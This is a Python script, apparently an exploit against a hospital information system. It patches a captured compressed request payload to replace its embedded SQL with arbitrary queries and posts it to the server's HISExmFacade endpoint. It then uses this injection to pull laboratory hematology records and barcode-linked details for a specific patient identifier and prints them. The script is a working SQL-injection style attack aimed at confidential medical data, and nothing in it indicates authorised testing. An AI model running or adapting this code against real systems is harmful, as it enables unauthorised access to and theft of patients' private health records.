from his_client_final import HISClient
import requests
import zlib
import re

class LabHemHunter(HISClient):
    def execute_sql(self, sql):
        #print(f"[*] Executing: {sql.strip()}")
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = LabHemHunter()
hidno = 'C221748019'

print(f"Querying LABIHEM for HIDNO {hidno}...")
sql = f"SELECT * FROM OPDUSR.LABIHEM WHERE HIDNO = '{hidno}' ORDER BY LIHEXAMDATE DESC"
res = hunter.execute_sql(sql)

if res and "<NewDataSet>" in res:
    print("!!! FOUND LABIHEM DATA !!!")
    print(res[:2000])
    
    # Extract LIHEBARDCODE
    barcodes = re.findall(r'<LIHEBARDCODE>(.*?)</LIHEBARDCODE>', res)
    if barcodes:
        target = barcodes[0]
        print(f"\nFetching details for LIHEBARDCODE: {target}")
        sql_det = f"SELECT * FROM OPDUSR.LABIHED WHERE LIHEBARDCODE = '{target}'"
        res_det = hunter.execute_sql(sql_det)
        if res_det and "<NewDataSet>" in res_det:
             print("!!! FOUND LABIHED DETAILS !!!")
             print(res_det[:5000])
        else:
             print("[-] No details found.")
else:
    print("[-] No data in LABIHEM.")
